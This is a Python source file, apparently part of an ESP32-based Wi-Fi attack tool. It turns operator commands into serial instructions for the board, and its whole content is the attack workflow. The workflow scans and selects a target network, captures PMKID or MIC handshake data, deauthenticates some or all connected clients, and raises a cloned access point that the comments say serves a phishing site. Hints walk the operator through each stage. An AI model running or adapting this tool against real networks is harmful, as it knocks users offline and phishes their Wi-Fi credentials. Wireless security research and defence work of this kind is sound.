# -*- coding: utf-8 -*-

# region Description
"""
esp32_com.py: Establish serial communication and translate commands to be sent to ESP32
Author: johndeweyzxc (johndewey02003@gmail.com)
"""
# endregion

from utils import int_to_padded_hex, ascii_to_hex, hex_to_ascii
from esp32_event import ESP32Event
from serial import Serial
import threading

OUT_YELLOW = "\033[93m"
OUT_GREEN = "\033[92m"
OUT_CYAN = "\033[36m"
COLOR_RESET = "\033[0m"

INITIALIZATION = 'initialization'
PRE_EXPLOITATION = 'preexploitation'
EXPLOITATION = 'exploitation'


class ESP32Com:
    def __init__(self, port: str, verbose: bool) -> None:
        self.port = Serial(port=port, baudrate=19200, timeout=1)
        self.verbose = verbose
        self.esp32_event = ESP32Event(self.port)
        self.stop_thread = threading.Event()

    def start_thread(self):
        read_thread = threading.Thread(target=self.read_thread)
        write_thread = threading.Thread(target=self.write_thread)
        read_thread.start()
        write_thread.start()

    def is_formatted_output(self, value_str: str, verbose: bool) -> bool:
        """ 
            Determine if the serial output is an event communication protocol
            by checking if the data is inside the curly brackets
        """

        value_list = list(value_str)
        last_item = len(value_list) - 1

        if value_list[0] == "{" and value_list[last_item] == "}":
            if verbose:
                print(f"{OUT_YELLOW}module_test.py> {value_str}{COLOR_RESET}")
            return True
        else:
            if verbose:
                print(value_str)
            return False

    def event_categorizer(self, value_str: str):
        value_str = value_str.replace('}', '').replace('{', '')
        value_list = value_str.split(',')
        context = value_list[0]

        if context == 'ESP_STARTED':
            self.esp32_event.event_start()
        elif context == 'CMD_PARSER':
            self.esp32_event.event_cmd_parser(value_list)
        elif context == 'WIFI_CTL':
            self.esp32_event.event_wifi_ctl(value_list)
        elif context == 'EXPLOITS':
            self.esp32_event.event_exploits(value_list)
        elif context == 'PMKID':
            self.esp32_event.event_pmkid(value_list)
        elif context == 'MIC':
            self.esp32_event.event_mic(value_list)
        elif context == 'WEB':
            self.esp32_event.event_web(value_list)

    def read_thread(self):
        """ Reads event ouput from ESP32 """

        while True:
            if self.stop_thread.is_set():
                break

            value = self.port.readline().replace(b'\n', b'').replace(b'\r', b'')
            try:
                value_str = str(value, 'UTF-8')
                if len(value_str) < 1:
                    continue
                if not self.is_formatted_output(value_str, self.verbose):
                    continue

                self.event_categorizer(value_str)
            except UnicodeDecodeError:
                pass

        print(f'{OUT_CYAN}Stopped write thread...{COLOR_RESET}')

    def instruction_assembly(self, cmd: str, cmd_list: list[str]) -> str:
        esp32_input = ''

        match cmd:
            case 'scan':
                # * SCAN FOR NEARBY ACCESS POINTS
                self.esp32_event.stage_state = INITIALIZATION

                print(
                    f'{OUT_CYAN}Scanning for nearby access points...{COLOR_RESET}')
                esp32_input = '07'
            case 'show':
                # * SHOW NEARBY ACCESS POINTS

                print(
                    f'{OUT_CYAN}Showing nearby access points...{COLOR_RESET}')
                if len(self.esp32_event.nearby_ap_list) == 0:
                    print(
                        f'{OUT_CYAN}No nearby access points found...{COLOR_RESET}')
                    return ''
                for i, ap in enumerate(self.esp32_event.nearby_ap_list):
                    print(
                        f'{OUT_CYAN}[{str(i)}] BSSID: {ap.bssid}, SSID: {ap.ssid}, RSSI: {ap.rssi}, Channel: {ap.channel}{COLOR_RESET}')
                print(
                    f'{OUT_GREEN}[HINT] Enter the command \'select [index]\' to select your target where index is a number...{COLOR_RESET}')
            case 'select':
                # * LOAD SELECTED TARGET ACCESS POINT
                self.esp32_event.stage_state = INITIALIZATION

                if len(self.esp32_event.nearby_ap_list) == 0:
                    print(
                        f'{OUT_CYAN}No nearby access points found, run \'scan\' to look for nearby access points...{COLOR_RESET}')
                    return ''

                selected_ap = self.esp32_event.nearby_ap_list[int(cmd_list[1])]
                self.esp32_event.load_target(selected_ap.bssid, selected_ap.ssid,
                                             selected_ap.channel, selected_ap.name_len, selected_ap.rssi)
                print(
                    f'{OUT_CYAN}Target selected \'{self.esp32_event.target_ap.ssid}\' at channel {str(self.esp32_event.target_ap.channel)}{COLOR_RESET}')
                print(
                    f'{OUT_GREEN}[HINT] Enter the command \'preexploit pmkid\' to monitor for PMKID or \'preexploit mic\' to monitor for MIC, this is an important procedure to follow...{COLOR_RESET}')
                esp32_input = ''

            case 'unselect':
                # * UNLOAD CURRENT TARGET ACCESS POINT
                self.esp32_event.stage_state = INITIALIZATION

                if not self.esp32_event.is_target_loaded:
                    print(
                        f'{OUT_CYAN}No target is currently loaded...{COLOR_RESET}')
                    return ''

                previous_target = self.esp32_event.unload_target()
                print(
                    f'{OUT_CYAN}Target unselected \'{previous_target.ssid}\'{COLOR_RESET}')
                esp32_input = ''

            case 'preexploit':
                # * STAGE 1: CAPTURING PAIRWISE MASTER KEY IDENTIFIER (PMKID) OR MESSAGE INTEGRITY CHECK (MIC)
                self.esp32_event.stage_state = PRE_EXPLOITATION

                if not self.esp32_event.is_target_loaded:
                    print(f'{OUT_CYAN}No target is selected...{COLOR_RESET}')
                    return ''

                mode = '05'
                key_type = '00'
                channel = int_to_padded_hex(self.esp32_event.target_ap.channel)
                name_len = int_to_padded_hex(
                    self.esp32_event.target_ap.name_len)
                ssid = ascii_to_hex(self.esp32_event.target_ap.ssid)
                bssid = self.esp32_event.target_ap.bssid.replace(':', '')

                msg = ''
                hint = ''

                # * STAGE 1 MODES
                if cmd_list[1] == 'deauth':
                    mode = '01'
                    msg = f'Starting deauthentication on network \'{hex_to_ascii(ssid)}\'...'
                if cmd_list[1] == 'pmkid':
                    key_type = '01'
                    msg = 'Starting PMKID monitor mode...'
                    hint = f'{OUT_GREEN}[HINT] Enter the command \'preexploit deauth\' to force the client to exchange keys...{COLOR_RESET}'
                elif cmd_list[1] == 'mic':
                    key_type = '00'
                    msg = 'Starting MIC monitor mode...'
                    hint = f'{OUT_GREEN}[HINT] Enter the command \'preexploit deauth\' to force the client to exchange keys...{COLOR_RESET}'
                elif cmd_list[1] == 'stop':
                    mode = '06'
                    msg = 'Stopping monitor mode...'

                print(
                    f'{OUT_CYAN}{msg}{COLOR_RESET}')
                print(hint)
                esp32_input = f'{mode}{key_type}{channel}{name_len}{bssid}{ssid}'

            case 'showclient':
                # * SHOW CLIENTS FROM TARGET ACCESS POINT
                self.esp32_event.stage_state = PRE_EXPLOITATION
                if len(self.esp32_event.clients_found) == 0:
                    print(
                        f'{OUT_CYAN}No client target was found on network \'{self.esp32_event.target_ap.ssid}\'...{COLOR_RESET}')
                    return ''
                print(
                    f'{OUT_CYAN}Devices connected to network \'{self.esp32_event.target_ap.ssid}\':{COLOR_RESET}')
                self.esp32_event.clients_found.insert(0, 'FFFFFFFFFFFF')
                for i, client_mac in enumerate(self.esp32_event.clients_found):
                    print(
                        f'{OUT_CYAN}[{str(i)}] MAC: {client_mac}{COLOR_RESET}')
                print(
                    f'{OUT_GREEN}[HINT] Enter the command \'selclient [index]\' to select your target client where index is a number, selecting \'0\' will target all clients...{COLOR_RESET}')

            case 'selclient':
                # * LOAD SELECTED CLIENT TARGET
                self.esp32_event.stage_state = PRE_EXPLOITATION
                if len(self.esp32_event.clients_found) == 0:
                    print(
                        f'{OUT_CYAN}No client target was found on network \'{self.esp32_event.target_ap.ssid}\'...{COLOR_RESET}')
                    return ''

                selected_client = self.esp32_event.clients_found[int(
                    cmd_list[1])]
                if selected_client == 'FFFFFFFFFFFF':
                    self.esp32_event.broadcast_attack = True
                else:
                    self.esp32_event.broadcast_attack = False
                self.esp32_event.load_client_target(selected_client)
                print(
                    f'{OUT_CYAN}Client target selected \'{selected_client}\' on network \'{self.esp32_event.target_ap.ssid}\'...{COLOR_RESET}')
                print(
                    f'{OUT_GREEN}[HINT] Enter the command \'exploit ap\' to start a clone of target access point...{COLOR_RESET}')
                esp32_input = f'0C000000{selected_client}'

            case 'exploit':
                # * STAGE 2: CLIENT DEAUTHENTICATION & PHISHING SITE
                self.esp32_event.stage_state = EXPLOITATION

                if not self.esp32_event.is_target_loaded:
                    print(f'{OUT_CYAN}No target is selected...{COLOR_RESET}')
                    return ''

                if not self.esp32_event.key_loaded:
                    print(
                        f'{OUT_CYAN}No PMKID/MIC key data is loaded...{COLOR_RESET}')
                    return ''

                mode = '00'
                key_type = '00'
                channel = int_to_padded_hex(self.esp32_event.target_ap.channel)
                name_len = int_to_padded_hex(
                    self.esp32_event.target_ap.name_len)
                ssid = ascii_to_hex(self.esp32_event.target_ap.ssid)
                bssid = self.esp32_event.target_ap.bssid.replace(':', '')

                msg = ''

                # * STAGE 2 MODES
                if cmd_list[1] == 'deauth':
                    if len(self.esp32_event.clients_connected) != 0:
                        print(
                            f'{OUT_CYAN}[WARNING] You cannot run deauthentication while there are clients connected to your access point, command aborted...{COLOR_RESET}')
                        return ''
                    mode = '01'
                    msg = f'Starting deauthentication on client \'{self.esp32_event.client_target}\' at network \'{hex_to_ascii(ssid)}\'...'
                elif cmd_list[1] == 'stopdeauth':
                    mode = '02'
                    msg = 'Stopping deauthentication...'
                elif cmd_list[1] == 'ap':
                    mode = '03'
                    msg = f'Starting access point with SSID set to \'{hex_to_ascii(ssid)}\'...'
                elif cmd_list[1] == 'stopap':
                    mode = '04'
                    msg = 'Closing our access point...'

                print(
                    f'{OUT_CYAN}{msg}{COLOR_RESET}')
                esp32_input = f'{mode}{key_type}{channel}{name_len}{bssid}{ssid}'

        return esp32_input

    def write_thread(self):
        """ Thread for listening to user input and converting the input into instruction code executable by ESP32 """

        while True:
            if self.stop_thread.is_set():
                break
            serial_input = input()
            if len(serial_input) < 1:
                continue
            if serial_input == 'close':
                self.stop_thread.set()
                return

            available_commands = ['scan',
                                  'show',
                                  'select',
                                  #   'unselect',
                                  'preexploit',
                                  'showclient',
                                  'selclient',
                                  'exploit'
                                  ]

            cmd_list = serial_input.split(' ')

            if cmd_list[0] in available_commands:
                esp32_input = self.instruction_assembly(cmd_list[0], cmd_list)

                if len(esp32_input) > 0:
                    self.port.write(esp32_input.encode())
            elif cmd_list[0] == 'restart':
                self.esp32_event.restart_esp32()
                print(f'{OUT_CYAN}Restarting ESP32...{COLOR_RESET}')
            else:
                # Invalid command
                print(f'{OUT_CYAN}Invalid command{COLOR_RESET}')

        print(f'{OUT_CYAN}Stopped read thread{COLOR_RESET}')
